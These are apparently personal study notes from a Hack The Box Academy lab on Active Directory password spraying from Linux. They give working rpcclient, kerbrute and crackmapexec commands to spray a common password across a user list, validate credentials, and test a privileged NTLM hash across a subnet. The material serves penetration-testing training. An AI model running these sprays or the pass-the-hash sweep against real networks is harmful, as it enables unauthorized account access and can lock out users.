Internal Password Spraying from Linux
#######################################

Date: 2024-12-20 14:59:56

Status: #new 

Tags: :ref:`active directory enumeration attacks`

----

Description
************

By using a list created from :ref:`password spraying` creating username lists
we are ready to use it to attack. 

.. danger:: Remember you can lock out accounts if you don't understand the password policy.  

Usage
*******

1. Using a bash loop and :ref:`rpcclient`
=========================================

.. code-block:: console

    for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done



2. Using :ref:`kerbrute`
======================

.. code-block:: console

    kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1


3. Using :ref:`crackmapexec`
===============================

.. code-block:: console

    sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +


Validating the credentials with :ref:`crackmapexec`
*****************************************************

.. code-block:: console

    sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123


Password re-use in the Domain
*******************************

It is common to see passwords reused on the same privileged accounts across the enterprise.  Once you have a hash of a privileged account, you can test this hash to see if it is used elsewhere.

Example 1.  Using :ref:`crackmapexec` to scan the network

.. code-block:: console

    sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

References
************
https://academy.hackthebox.com/module/143/section/1271